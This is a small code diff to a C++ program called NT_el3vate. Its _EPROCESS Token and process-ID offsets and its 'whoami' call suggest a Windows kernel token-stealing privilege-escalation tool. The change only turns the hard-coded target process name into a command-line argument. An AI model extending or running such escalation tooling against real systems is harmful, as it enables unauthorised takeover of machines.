@@ -16,7 +16,6 @@ unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
 unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
 unsigned __int64 _EPROCESS_Token_offset = 0;
 
-const char* targetProcess = "NT_el3vate.exe";
 
 
 void printBytes(void* ptr, int size)
@@ -30,6 +29,14 @@ void printBytes(void* ptr, int size)
 
 int main(int argc, char** argv)
 {
+
+	if (argc < 2) {
+		printf("Usage: .\\NT_el3vate.exe <processName>");
+		return EXIT_FAILURE;
+	}
+
+	char* targetProcess = argv[1];
+
 	// measure execution time of program
 	auto start = std::chrono::high_resolution_clock::now();
 	system("whoami");
